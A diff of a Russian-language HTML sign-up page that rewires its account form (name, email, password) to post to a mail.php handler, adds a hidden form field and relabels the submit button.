@@ -28,17 +28,12 @@
 				<div class="right">
 					<h1>Сохрани свой аккаунт</h1>
 					<p>Получи бесплатно неограниченное количество форм, вопросов и ответов.</p>
-					<form id="loginForm" action="thanks.html">
-						<div class="form-group">
-							<input type="name" name="name" class="form-control login" id="login" placeholder="Имя или никнейм">
-						</div>
-						<div class="form-group">
+					<form id="loginForm" action="mail.php" method="POST">
+							<input type="hidden" name="form-one" value="Первая форма">
+							<input type="name" name="username" class="form-control login" id="login" placeholder="Имя или никнейм">
 							<input type="email" name="email" class="form-control email" id="email"  placeholder="Email" required/>
-						</div>
-						<div class="form-group">
 							<input type="password" name="password" class="form-control pass" minlength="5" id="password" placeholder="Пароль" required/>
-						</div>
-						<button type="submit" class="btn btn-primary">Сохранить</button>
+						<button type="submit" class="btn btn-primary">Войти</button>
 					</form>
 					<p class="small">Уже есть аккаунт? <a href="#">Войти</a></p>
 				</div>	
